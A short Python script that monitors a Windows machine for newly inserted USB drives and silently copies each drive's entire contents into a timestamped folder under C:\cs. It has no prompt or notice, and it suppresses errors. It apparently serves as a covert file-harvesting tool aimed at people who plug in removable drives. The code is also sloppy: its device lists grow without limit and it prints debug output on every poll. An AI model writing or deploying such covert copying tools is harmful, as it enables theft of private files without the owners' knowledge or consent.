# -*- coding:utf-8 -*-
import psutil
import sys
import os
import shutil
import time

local_device = []
mobile_device = []
local_number = 0
mobile_number = 0
SAVE_path = ["C:\\cs", 0]
# 更新usb端口状态
def update():
    tmp_local_number = 0
    tmp_mobile_number = 0
    try:
        part = psutil.disk_partitions()
    except:
        # print("程序异常")
        sys.exit()
    for i in range(len(part)):
        tmp_list = part[i].opts.split(',')
        print(tmp_list)
        if "fixed" in tmp_list:
            tmp_local_number = tmp_local_number + 1
            local_device.append(part[i].device)
        elif "removable" in tmp_list:
            tmp_mobile_number = tmp_mobile_number + 1
            mobile_device.append(part[i].device)
            pass
        pass
    return [len(part), tmp_local_number, tmp_mobile_number]


# 复制文件
def copy_file(USB_path):
    save_path = "C:\\cs"+str(int(time.time()))
    if os.path.exists(USB_path):
        try:
            shutil.copytree(USB_path, save_path)
        except:
            pass
    else:
        time.sleep(10)


if __name__ == '__main__':
    data = update()
    now_local_number = 0
    now_mobile_number = 0
    before_number = data[0]
    local_number = data[1]
    mobile_number = data[2]
    now_number = 0
    while True:
        data = update()
        now_number = data[0]
        now_local_number = data[1]
        now_mobile_number = data[2]
        if now_mobile_number > mobile_number:
            if len(mobile_device):
                copy_file(mobile_device[-1])
            else:
                pass
            before_number = now_number
            local_number = now_local_number
            mobile_number = now_mobile_number
        elif now_mobile_number < mobile_number:
            before_number = now_number
            local_number = now_local_number
            mobile_number = now_mobile_number
            pass
        time.sleep(5)